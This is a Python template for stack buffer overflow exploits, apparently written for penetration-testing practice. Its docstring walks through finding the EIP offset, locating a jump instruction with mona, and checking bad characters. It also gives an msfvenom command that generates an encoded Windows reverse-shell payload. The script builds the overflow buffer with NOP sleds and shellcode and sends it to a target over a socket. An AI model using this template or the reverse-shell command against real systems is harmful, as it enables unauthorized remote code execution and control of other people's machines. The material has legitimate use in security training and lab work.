# Created by PrivacyMonk3y from Hacking Team R41D3rS

"""
1. Use a fuzzer or check poc for offset
3. Copy the EIP at crash. Run msf-pattern_offset -l # -q #eip_return#
4. Use !mona modules & !mona find -s "\xff\xe4" -m "PROCESSNAME" to find a good jump. (Might need to tweak ASM code)
5. After changing EIP, start checking for bad chars.
6. Create a shell code payload with venom.
   Example: msfvenom -p windows/shell_reverse_tcp LHOST=1.1.1.1 LPORT=1337 -b '\x00\x0a\x0d\x25\x26\x2b\x3d' -f python -v shell
   Extra options: (EXITFUNC=thread)  (-e x86/shikata_ga_nai)
7. If there are issues try using a nop sled. Using this to bypass hard locations where your code gets altered or terminated. Start small.
8. If you don't have a shell try adjusting payload or going back in the process and starting over.
"""

import socket

ip = "1.1.1.1"
port = 1337


prefix = "Ascii_Inputs" # If the poc has ascii or other input to trigger put here.
finder = "" # msf-pattern_create payload

offset = 0  # The Offset returned
buff = "A" * offset # This is just filler to make the overflow happen
eip = "" # Your EIP jump point

badc = (
"\x90\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

# Bads found = "\x00   "


sled1 = "\x90" *0  # sled 1, Change as needed
sled2 = "\x90" *0  # sled 2, Change as needed

# PASTE YOUR PAYLOAD STRING HERE & REPLACE THIS WITH THE CMD USED!!!
shell = "" # the payload you crafted


buffer = finder				   # Used to find EIP with msf_pattern_create -l #
#buffer = prefix + finder 		# Use this one to do the above but with a prefix

#buffer = buff + eip + badc     # Use this to check for bad chars 
#buffer = prefix + buff + eip + badc    # Same as above with prefix

#buffer = buff + eip + sled1 + shell + sled2 			# Final Payload
#buffer = prefix + buff + eip + sled1 + shell + sled2	# Prefix + Final Payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending 3v!l_P4Yl04D-2.0 MOHAHAHA...")
    s.send(buffer) # + "\r\n"  --- This is the payload being sent. Change as needed for the exploit!!!!!
    print("Done!")
except:
    print("Could not connect.\nNot Enough 3v!lN3SS!\nTry Again!")

"""
Notes
----------


"""
